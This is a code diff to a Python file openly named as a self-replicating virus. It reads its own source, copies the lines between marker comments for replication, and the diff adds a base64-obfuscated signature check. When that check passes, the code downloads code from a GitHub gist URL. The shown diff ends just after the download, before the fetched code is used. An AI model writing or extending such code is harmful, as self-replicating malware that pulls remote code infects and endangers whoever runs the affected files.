@@ -3,11 +3,14 @@ import sys
 import glob
 import os
 import urllib.request
-sig = 'Virus.py by NarmakTwo on Github/NarmakTwo on Replit'
+import base64
+sig = 'Virus.py by NarmakTwo on Github'
 ff = sys.argv[0]
 virus_code = []
 with open(sys.argv[0], 'r') as f:
     lines = f.readlines()
+with open(sys.argv[0], 'r') as f:
+    full = f.read()
 self_replicating_part = False
 for line in lines:
     if line == "# VIRUS SAYS HI!":
@@ -16,7 +19,7 @@ for line in lines:
         virus_code.append(line)
     if line == "# VIRUS SAYS BYE!\n":
         break
-if 'sig = \'Virus.py by NarmakTwo on Github/NarmakTwo on Replit\'' in lines:
+if base64.b64decode('TmFybWFrVHdv').decode() in full:
   fp = urllib.request.urlopen("https://gist.githubusercontent.com/NarmakTwo/45ba9e421fdeb87ee3bb1a265d85f3e2/raw/62bfae6a810ecd6d3c9cb31bb961dfba489b86de/code.py")
   mybytes = fp.read()
   mystr = mybytes.decode("utf8")
